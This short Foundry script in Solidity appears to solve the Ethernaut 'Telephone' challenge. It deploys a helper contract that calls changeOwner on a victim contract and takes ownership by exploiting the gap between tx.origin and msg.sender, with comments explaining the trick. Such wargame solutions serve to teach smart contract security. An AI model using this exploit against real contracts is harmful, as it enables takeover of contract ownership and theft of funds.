// SDPX-License-Identifier: MIT

pragma solidity ^0.6.2;

import {Script} from "forge-std/Script.sol";

import {Constants} from "./Constants.s.sol";

interface ITelephone {
    function changeOwner(address _owner) external;
}

contract TelephoneAttack {
    constructor(ITelephone victim, address newOwner) public {
        victim.changeOwner(newOwner);
    }
}

contract TelephoneAttacker is Constants, Script {

    function run() public {
        ITelephone victim = ITelephone(TELEPHONE_ADDRESS);

        vm.startBroadcast(ATTACKER_ADDRESS);
        attack(victim);
        vm.stopBroadcast();
    }
    
    function attack(ITelephone victim) private {
        // 1. TelephoneAttacker will be the tx.origin
        // 2. TelephoneAttack will be the msg.sender
        new TelephoneAttack(victim, ATTACKER_ADDRESS);
    }
}